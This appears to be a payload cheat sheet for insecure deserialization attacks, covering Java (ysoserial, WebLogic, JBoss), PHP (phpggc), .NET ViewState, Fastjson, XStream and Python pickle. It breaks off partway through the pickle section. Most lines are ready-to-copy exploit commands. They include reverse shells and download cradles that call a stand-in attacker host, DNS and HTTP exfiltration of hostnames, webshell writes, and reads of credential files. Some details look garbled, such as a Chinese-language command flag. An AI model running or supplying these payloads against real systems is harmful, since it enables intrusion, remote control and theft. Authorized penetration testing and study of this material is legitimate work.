# web-deserialization — payloads (verbatim from kali-claw)

# Web Deserialization Payloads

> This file is a companion to `SKILL.md`, organizing common payloads for insecure deserialization testing by language and exploitation technique.
> Purpose: Quickly find payloads for specific deserialization scenarios, ready to copy for testing.
> All payloads are for authorized security testing only.

---

## Index

1. [Java Deserialization (ysoserial)](#1-java-deserialization-ysoserial)
2. [PHP Deserialization (phpggc)](#2-php-deserialization-phpggc)
3. [.NET Deserialization (ysoserial.net)](#3-net-deserialization-ysoserialnet)
4. [Blind Deserialization Detection](#4-blind-deserialization-detection)
5. [Jackson/Fastjson Deserialization](#5-jacksonfastjson-deserialization)
6. [Python Pickle Deserialization](#6-python-pickle-deserialization)
7. [Ruby Deserialization](#7-ruby-deserialization)
8. [Gadget Chain Analysis](#8-gadget-chain-analysis)
9. [Deserialization Bypass Techniques](#9-deserialization-bypass-techniques)
10. [Node.js Deserialization Payloads](#10-nodejs-deserialization-payloads)
11. [.NET BinaryFormatter Payloads](#11-net-binaryformatter-payloads)
12. [.NET ViewState Exploitation](#12-net-viewstate-exploitation)
13. [Ruby Deserialization Payloads](#13-ruby-deserialization-payloads)
14. [PHP Phar Deserialization](#14-php-phar-deserialization)
15. [Python Pickle RCE Payloads](#15-python-pickle-rce-payloads)
16. [Gadget Chain Reference](#16-gadget-chain-reference)
17. [Deserialization Detection Payloads](#17-deserialization-detection-payloads)
18. [WAF and Filter Bypass Payloads](#18-waf-and-filter-bypass-payloads)

---

## 1. Java Deserialization (ysoserial)

### Listing Available Gadget Chains

```bash
# Display all available ysoserial gadget chains with descriptions
java -jar ysoserial.jar --help

# List only chain names for scripting
java -jar ysoserial.jar 2>&1 | grep -E '^\s+[A-Z]' | awk '{print $1}'
```

### CommonsCollections Exploitation

```bash
# CommonsCollections1 - uses InvokerTransformer (pre-3.2.2)
java -jar ysoserial.jar CommonsCollections1 'whoami' > payload.bin

# CommonsCollections5 - works with SecurityManager, uses InvokerTransformer
java -jar ysoserial.jar CommonsCollections5 'id' | base64 -w0

# CommonsCollections6 - uses HashSet + InvokerTransformer chain
java -jar ysoserial.jar CommonsCollections6 'cat /etc/passwd' | base64 -w0

# CommonsCollections7 - uses Hashtable + ChainedTransformer
java -jar ysoserial.jar CommonsCollections7 'curl http://attacker/exfil?c=$(whoami)' | base64 -w0
```

### Spring and Hibernate Chains

```bash
# Spring1 - uses ObjectFactoryDelegatingInvocationHandler
java -jar ysoserial.jar Spring1 'touch /tmp/spring-rce' | base64 -w0

# Spring2 - uses SerializableTypeWrapper.MethodInvokeTypeProvider
java -jar ysoserial.jar Spring2 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzEyMzQgMD4mMQ==}|{base64,-d}|bash' | base64 -w0

# Hibernate1 - uses ComponentType.getPropertyValue()
java -jar ysoserial.jar Hibernate1 'whoami' | base64 -w0

# Hibernate2 - uses TypedPropertyValue
java -jar ysoserial.jar Hibernate2 'id' > hib_payload.bin
```

### Additional Library-Specific Chains

```bash
# BeanShell1 - uses bsh.Interpreter
java -jar ysoserial.jar BeanShell1 'id' | base64 -w0

# C3P0 - uses com.mchange.v2.c3p0.JndiRefForwardingDataSource
java -jar ysoserial.jar C3P0 'ldap://attacker:1389/Exploit' | base64 -w0

# JBossInterceptors1 - JBoss/WildFly specific
java -jar ysoserial.jar JBossInterceptors1 'whoami' | base64 -w0

# Wicket1 - Apache Wicket framework
java -jar ysoserial.jar Wicket1 'id' | base64 -w0
```

### File-Based Payload Delivery

```bash
# Write payload to file for multipart upload
java -jar ysoserial.jar CommonsCollections5 'wget http://attacker/shell -O /tmp/shell' > /tmp/upload_payload.bin
```

```bash
# Generate payload with specific encoding for cookie injection
java -jar ysoserial.jar CommonsCollections6 'id' | gzip | base64 -w0
```

```bash
# Generate URL-safe Base64 for GET parameters
java -jar ysoserial.jar CommonsCollections5 'nslookup attacker.com' | base64 -w0 | tr '+/' '-_'
```

```bash
# Double-URL-encode for Tomcat and other servers
java -jar ysoserial.jar CommonsCollections5 'id' | base64 -w0 | python3 -c "
import sys, urllib.parse
print(urllib.parse.quote(urllib.parse.quote(sys.stdin.read().strip()), safe=''))
"
```

### WebLogic and JBoss Targeting

```bash
# WebLogic T3 protocol deserialization
java -jar ysoserial.jar CommonsCollections5 'id' | python3 -c "
import sys, base64, socket
payload = sys.stdin.buffer.read()
# Wrap in T3 protocol header for WebLogic RMI
t3_header = b't3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://target:7001\n\n'
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('target', 7001))
sock.send(t3_header)
print('T3 payload sent')
"

# JBoss JMXInvokerServlet deserialization
curl -X POST http://target:8080/invoker/JMXInvokerServlet \
  -H 'Content-Type: application/x-java-serialized-object' \
  --data-binary @<(java -jar ysoserial.jar CommonsCollections5 'id')
```

### IBM WebSphere Targeting

```bash
# WebSphere SOAP connector deserialization
java -jar ysoserial.jar CommonsCollections6 'nslookup was.attacker.com' | base64 -w0

# WebSphere admin console serialization
curl -X POST http://target:9043/ibm/console/ \
  -H 'Content-Type: application/x-java-serialized-object' \
  --data-binary @<(java -jar ysoserial.jar Jdk7u21 'id')
```

### JRMP Listener for Chained Exploitation

```bash
# Start JRMP listener serving payload to any connecting client
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 'id'

# Use marshalsec to start JNDI/LDAP redirector
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker:8000 1389

# Use marshalsec for RMI registry exploitation
java -cp marshalsec.jar marshalsec.jndi.RMIRefServer http://attacker:8000 1099

# Combine JRMP client payload with listener for firewall traversal
java -jar ysoserial.jar JRMPClient 'attacker:1099' | base64 -w0
# On attacker machine:
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 'reverse_shell_command'
```

### Custom Command Encoding

```bash
# Bash pipe reverse shell with ysoserial
java -jar ysoserial.jar CommonsCollections5 'bash -i >& /dev/tcp/attacker/4444 0>&1' | base64 -w0

# PowerShell download cradle for Windows targets
java -jar ysoserial.jar CommonsCollections6 'powershell IEX(New-Object Net.WebClient).DownloadString("http://attacker/ps.ps1")' | base64 -w0

# Python reverse shell via Runtime.exec()
java -jar ysoserial.jar CommonsCollections5 'python -c "import socket,subprocess,os;s=socket.socket();s.connect((\"attacker\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])"' | base64 -w0

# Use BashFXMLServer for complex payloads requiring arguments
java -jar ysoserial.jar CommonsCollections5 'bash -c "bash${IFS}-i${IFS}>&${IFS}/dev/tcp/attacker/4444${IFS}0>&1"' | base64 -w0
```

---

## 2. PHP Deserialization (phpggc)

### Chain Discovery and Listing

```bash
# List all available PHP gadget chains grouped by framework
phpggc -l

# List chains for a specific framework
phpggc -l | grep -i laravel
phpggc -l | grep -i wordpress
phpggc -l | grep -i magento

# Show chain details and requirements
phpggc --详细信息 Laravel/RCE1
```

### Laravel Exploitation

```bash
# Laravel RCE1 - Monolog/RCE1 chain
phpggc Laravel/RCE1 'system("id")'

# Laravel RCE2 - different gadget path
phpggc Laravel/RCE2 'system("cat /etc/passwd")'

# Laravel RCE3 - via Ignition middleware
phpggc Laravel/RCE3 'bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"'

# Laravel RCE4 - via PendingCommand
phpggc Laravel/RCE4 'id' --base64

# Laravel RCE5 - via ReturnCallback
phpggc -b Laravel/RCE5 'wget http://attacker/$(whoami)'

# File write via Laravel chain
phpggc Laravel/RCE1 'file_put_contents("/var/www/shell.php","<?php system(\$_GET[0]); ?>")'
```

### WordPress and WooCommerce Chains

```bash
# WordPress Generic RCE
phpggc WordPress/Generic 'system("id")'

# WooCommerce order meta injection
phpggc WooCommerce/RCE1 'system("cat /wp-config.php")'

# WordPress file write chain
phpggc WordPress/Generic 'file_put_contents("/var/www/html/wp-content/uploads/shell.php","<?php eval(\$_POST[0]); ?>")'
```

### Magento Exploitation

```bash
# Magento RCE via Magento_Smarty chain
phpggc Magento/RCE1 'id'

# Magento2 RCE
phpggc Magento2/RCE1 'system("cat /app/etc/env.php")'

# URL-encoded output for POST parameter injection
phpggc -u Magento/RCE1 'curl http://attacker/$(whoami)'

# Magento file write for webshell deployment
phpggc Magento/RCE2 'file_put_contents("/var/www/html/pub/media/s.php","<?php system(\$_GET[c]);")'
```

### Slim Framework and Laminas Chains

```bash
# Slim framework chain
phpggc Slim/RCE1 'system("id")'
phpggc Slim/RCE2 'whoami'

# Laminas (successor to Zend Framework)
phpggc Laminas/RCE1 'cat /etc/passwd'
```

### Additional PHP Framework Chains

```bash
# Guzzle chain (common dependency)
phpggc Guzzle/RCE1 'system("whoami")'
phpggc Guzzle/RCE2 'id'
```

```bash
# Monolog chain (very common logging library)
phpggc Monolog/RCE1 'system("cat /etc/passwd")'
phpggc Monolog/RCE2 'bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"'
```

```bash
# Symfony chains
phpggc Symfony/RCE1 'system("id")'
phpggc Symfony/RCE2 'id'
phpggc Symfony/RCE3 'curl http://attacker/$(hostname)'
```

```bash
# Doctrine chain
phpggc Doctrine/RCE1 'system("whoami")'
```

```bash
# ZendFramework chain
phpggc ZendFramework/RCE1 'id'
```

### Encoding and Wrappers

```bash
# Base64 wrapper for binary-safe transport
phpggc -b Laravel/RCE1 'system("id")'
```

```bash
# URL-encoding for GET parameters
phpggc -u Laravel/RCE1 'system("id")'
```

```bash
# Combined base64 + URL-encoding
phpggc -b -u Magento/RCE1 'cat /etc/passwd'
```

```bash
# Phar wrapper for file-based deserialization trigger
phpggc -p phar Laravel/RCE1 'system("id")' -o exploit.phar
```

```bash
# Generate ZIP-based phar for upload bypass
phpggc -p zip Laravel/RCE1 'system("id")' -o exploit.zip
```

### PHP Deserialization via file_get_contents Triggers

```bash
# Trigger phar deserialization via image processing
# When target uses getimagesize(), imagecreatefrompng() etc.
convert exploit.phar exploit.png
# Upload the PNG with embedded phar metadata
# Target calls: getimagesize("phar://exploit.png")

# Trigger via exif_read_metadata
phpggc -p phar Laravel/RCE1 'system("id")' -o exif_payload.jpg

# PHP filter chain to trigger deserialization without phar
# Use php://filter wrapper to reach unserialize
curl "http://target/page?file=php://filter/convert.base64-encode/resource=/path/to/serialized/data"
```

---

## 3. .NET Deserialization (ysoserial.net)

### ViewState Exploitation

```bash
# Generate ViewState payload with known machineKey
ysoserial.net -g ObjectDataProvider -f LosFormatter -c "cmd /c whoami" --base64 --machinekey "validationKey,decryptionKey" --path="/default.aspx" --target=ViewState

# ViewState with custom validation algorithm
ysoserial.net -g TypeConfuseDelegate -f LosFormatter -c "cmd /c whoami" --base64 --machinekey "AA...hex...,BB...hex..." --validation SHA1 --decryption AES

# ViewState without MAC (legacy ASP.NET)
ysoserial.net -g ObjectDataProvider -f LosFormatter -c "cmd /c echo pwned > C:\pwned.txt" --base64

# Target specific .NET Framework version
ysoserial.net -g ActivitySurrogateSelector -f BinaryFormatter -c "cmd /c calc.exe" --base64 --target=ViewState --islegacy --isdebug
```

### BinaryFormatter Exploits

```bash
# ObjectDataProvider gadget with BinaryFormatter
ysoserial.net -g ObjectDataProvider -f BinaryFormatter -c "cmd /c whoami" --base64

# TypeConfuseDelegate gadget
ysoserial.net -g TypeConfuseDelegate -f BinaryFormatter -c "cmd /c whoami" --base64

# TextFormattingRunProperties gadget (works in Visual Studio extensions)
ysoserial.net -g TextFormattingRunProperties -f BinaryFormatter -c "cmd /c powershell IEX(New-Object Net.WebClient).DownloadString('http://attacker/ps.ps1')" --base64

# ActivitySurrogateSelector gadget
ysoserial.net -g ActivitySurrogateSelector -f BinaryFormatter -c "cmd /c calc.exe" --base64

# WindowsIdentity gadget (requires System.IdentityModel)
ysoserial.net -g WindowsIdentity -f BinaryFormatter -c "cmd /c whoami" --base64
```

### LosFormatter and ObjectStateFormatter

```bash
# LosFormatter output for ASP.NET ViewState
ysoserial.net -g ObjectDataProvider -f LosFormatter -c "cmd /c whoami" --base64

# ObjectStateFormatter for hidden field __VIEWSTATE
ysoserial.net -g TypeConfuseDelegate -f ObjectStateFormatter -c "cmd /c echo pwned" --base64

# NetDataContractSerializer (WCF)
ysoserial.net -g ObjectDataProvider -f NetDataContractSerializer -c "cmd /c whoami" --base64

# DataContractSerializer (requires known types)
ysoserial.net -g WindowsIdentity -f DataContractSerializer -c "cmd /c whoami" --base64
```

### PowerShell Reverse Shell Payloads

```bash
# Download cradle via ysoserial.net
ysoserial.net -g ObjectDataProvider -f LosFormatter -c "powershell -enc BASE64_ENCODED_PS_COMMAND" --base64

# Reverse shell with encoded command
# Step 1: Generate PS reverse shell
ps_command='$c=New-Object System.Net.Sockets.TcpClient("attacker",4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+"PS "+(pwd).Path+"> ";$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)};$c.Close()'
# Step 2: Base64 encode
echo -n $ps_command | iconv -t UTF-16LE | base64 -w0
# Step 3: Generate payload
ysoserial.net -g TypeConfuseDelegate -f LosFormatter -c "powershell -enc BASE64_STRING" --base64

# Command staging via certutil
ysoserial.net -g ObjectDataProvider -f BinaryFormatter -c "cmd /c certutil -urlcache -split -f http://attacker/payload.exe C:\\temp\\p.exe && C:\\temp\\p.exe" --base64
```

---

## 4. Blind Deserialization Detection

### DNS-Based Detection

```bash
# GadgetProbe DNS enumeration
java -cp gadgetprobe.jar GadgetProbe --dns-callback attacker.burpcollaborator.net --input suspect_data.bin

# ysoserial with nslookup for DNS callback
java -jar ysoserial.jar CommonsCollections5 'nslookup attacker.com' | base64 -w0

# Use dig for more reliable DNS resolution
java -jar ysoserial.jar CommonsCollections6 'dig $(whoami).attacker.com' | base64 -w0

# DNS exfiltration of hostname
java -jar ysoserial.jar CommonsCollections5 'nslookup $(hostname).attacker.com' | base64 -w0

# Multi-stage DNS detection with different chains
for chain in CommonsCollections1 CommonsCollections5 CommonsCollections6 CommonsCollections7; do
  java -jar ysoserial.jar $chain "nslookup ${chain}.attacker.com" | base64 -w0
  echo "Chain: $chain"
done
```

### HTTP-Based Detection

```bash
# HTTP GET callback to confirm execution
java -jar ysoserial.jar CommonsCollections5 'curl http://attacker/rce-confirmed' | base64 -w0

# HTTP callback with unique identifier per chain
java -jar ysoserial.jar CommonsCollections6 'wget http://attacker/deser-$(date +%s)' | base64 -w0

# PHP HTTP callback
phpggc -b Laravel/RCE1 'file_get_contents("http://attacker/php-deser")'

# .NET HTTP callback
ysoserial.net -g ObjectDataProvider -f LosFormatter -c "cmd /c curl http://attacker/dotnet-deser" --base64

# Python HTTP callback via pickle
python3 -c "
import pickle, os, base64
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('curl http://attacker/pickle-deser',))
print(base64.b64encode(pickle.dumps(Exploit())).decode())
"
```

### Time-Based Detection

```bash
# 5-second delay to confirm Java deserialization
java -jar ysoserial.jar CommonsCollections5 'sleep 5' | base64 -w0

# 10-second delay for high-latency targets
java -jar ysoserial.jar CommonsCollections6 'sleep 10' | base64 -w0

# PHP sleep-based detection
phpggc -b Laravel/RCE1 'sleep(5)'

# .NET time-based detection with ping
ysoserial.net -g TypeConfuseDelegate -f BinaryFormatter -c "cmd /c ping -n 6 127.0.0.1" --base64

# Python time-based pickle payload
python3 -c "
import pickle, time, base64
class TimeDelay:
    def __reduce__(self):
        return (time.sleep, (5,))
print(base64.b64encode(pickle.dumps(TimeDelay())).decode())
"

# Measure response time with curl
time curl -s -o /dev/null -w '%{time_total}' \
  -H 'Cookie: session=BASE64_PAYLOAD_HERE' \
  http://target/page
```

---

## 5. Jackson/Fastjson Deserialization

### Jackson Polymorphic Deserialization

```bash
# Exploit DEFAULT_TYPING enabled Jackson
# Craft JSON with @class type hint pointing to exploitable class
cat > jackson_payload.json << 'JSONEOF'
["com.sun.rowset.JdbcRowSetImpl", {
  "dataSourceName": "ldap://attacker:1389/Exploit",
  "autoCommit": true
}]
JSONEOF

# Jackson with Hibernate chain
cat > hibernate_jackson.json << 'JSONEOF'
["org.hibernate.engine.spi.TypedValue", {
  "value": "any",
  "type": {
    "class": "org.hibernate.type.ComponentType",
    "propertyTypes": [{"class": "org.hibernate.type.StringType"}],
    "propertyNames": ["a"]
  }
}]
JSONEOF

# Chained Jackson exploitation with Spring
cat > spring_jackson.json << 'JSONEOF'
["org.springframework.context.support.ClassPathXmlApplicationContext", "http://attacker/beans.xml"]
JSONEOF
```

### Fastjson Exploitation

```bash
# Fastjson 1.2.24 autotype bypass (CVE-2017-18349)
# JdbcRowSetImpl JNDI injection
curl -X POST http://target/api \
  -H 'Content-Type: application/json' \
  -d '{
    "@type":"com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName":"ldap://attacker:1389/Exploit",
    "autoCommit":true
  }'

# Fastjson with JNDI via RMI
curl -X POST http://target/api \
  -H 'Content-Type: application/json' \
  -d '{
    "@type":"com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName":"rmi://attacker:1099/Exploit",
    "autoCommit":true
  }'

# Fastjson 1.2.47 bypass via java.lang.Class cache (CVE-2019-9081)
curl -X POST http://target/api \
  -H 'Content-Type: application/json' \
  -d '{
    "a": {
      "@type": "java.lang.Class",
      "val": "com.sun.rowset.JdbcRowSetImpl"
    },
    "b": {
      "@type": "com.sun.rowset.JdbcRowSetImpl",
      "dataSourceName": "ldap://attacker:1389/Exploit",
      "autoCommit": true
    }
  }'

# Fastjson 1.2.68 bypass via expectClass
curl -X POST http://target/api \
  -H 'Content-Type: application/json' \
  -d '{
    "@type": "java.lang.AutoCloseable",
    "@type": "com.ibm.as400.access.RemoteCommandImpl",
    "host": "attacker",
    "port": 4444
  }'

# Fastjson with local class path gadget
curl -X POST http://target/api \
  -H 'Content-Type: application/json' \
  -d '{
    "@type":"java.net.Inet4Address",
    "val":"attacker.com"
  }'
```

### XStream Deserialization

```bash
# XStream ProcessBuilder RCE
curl -X POST http://target/api \
  -H 'Content-Type: application/xml' \
  -d '<java.util.ProcessBuilder>
    <command>
      <string>cmd</string><string>/c</string><string>whoami</string>
    </command>
  </java.util.ProcessBuilder>'

# XStream with EventHandler proxy
curl -X POST http://target/api \
  -H 'Content-Type: application/xml' \
  -d '<dynamic-proxy>
    <interface>java.lang.Runnable</interface>
    <handler class="java.beans.EventHandler">
      <target class="java.lang.ProcessBuilder">
        <command><string>cmd</string><string>/c</string><string>calc</string></command>
      </target>
      <action>start</action>
    </handler>
  </dynamic-proxy>'

# XStream ImageIO trigger (CVE-2021-39154)
curl -X POST http://target/api \
  -H 'Content-Type: application/xml' \
  -d '<map>
    <entry>
      <jdk.nashorn.internal.objects.NativeString><flags>0</flags><value>test</value></jdk.nashorn.internal.objects.NativeString>
      <jdk.nashorn.internal.objects.NativeString><flags>0</flags><value>test</value></jdk.nashorn.internal.objects.NativeString>
    </entry>
  </map>'
```

---

## 6. Python Pickle Deserialization

### Basic RCE Payloads

```bash
# Simple os.system RCE via pickle
python3 -c "
import pickle, base64, os
class RCE:

<!-- truncated for token budget; see external/kali-claw for the rest -->

